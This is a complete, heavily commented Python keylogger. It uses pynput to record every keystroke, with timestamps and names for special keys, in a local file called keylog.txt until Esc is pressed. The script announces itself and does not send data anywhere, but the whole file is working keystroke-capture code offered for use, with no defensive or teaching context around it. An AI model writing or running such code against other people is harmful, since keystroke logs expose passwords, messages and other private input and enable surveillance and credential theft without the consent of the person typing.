import logging
from pynput import keyboard

# --- Configuration ---
# Define the log file where keystrokes will be saved.
# Ensure you have write permissions in the directory where this script is run.
LOG_FILE = "keylog.txt"

# Configure the logging module.
# This sets up how messages (keystrokes) are formatted and where they are saved.
logging.basicConfig(
    filename=LOG_FILE,  # The file to write logs to.
    level=logging.DEBUG,  # Log all messages (DEBUG, INFO, WARNING, ERROR, CRITICAL).
    format='%(asctime)s: %(message)s'  # Format: timestamp: message.
)

# --- Event Handlers ---

def on_press(key):
    """
    This function is called whenever a key is pressed.
    It logs the pressed key to the configured log file.
    """
    try:
        # Attempt to log the character representation of the key.
        # This works for alphanumeric keys and symbols.
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # Handle special keys (e.g., Space, Enter, Shift, Ctrl, Alt).
        # These keys do not have a 'char' attribute.
        # We log their name attribute instead.
        if key == keyboard.Key.space:
            # Special handling for space to make it more readable in the log.
            logging.info("Key pressed: [SPACE]")
        elif key == keyboard.Key.enter:
            # Special handling for enter key.
            logging.info("Key pressed: [ENTER]")
        else:
            # Log other special keys by their name.
            logging.info(f"Key pressed: {key.name}")

def on_release(key):
    """
    This function is called whenever a key is released.
    It provides a mechanism to stop the keylogger by pressing the 'Esc' key.
    """
    # Check if the released key is the Escape key.
    if key == keyboard.Key.esc:
        logging.info("Keylogger stopped by user (Escape key pressed).")
        # Stop the listener, which terminates the program.
        return False

# --- Main Keylogger Logic ---

if __name__ == "__main__":
    print(f"Keylogger started. All keystrokes will be logged to '{LOG_FILE}'.")
    print("Press 'Esc' to stop the keylogger.")

    # Create a keyboard listener.
    # The 'on_press' function will be called when a key is pressed.
    # The 'on_release' function will be called when a key is released.
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        # Start listening for keyboard events.
        # This call blocks the main thread until the listener is stopped
        # (e.g., by returning False from on_release).
        listener.join()

    print("Keylogger stopped. Check the log file for recorded keystrokes.")
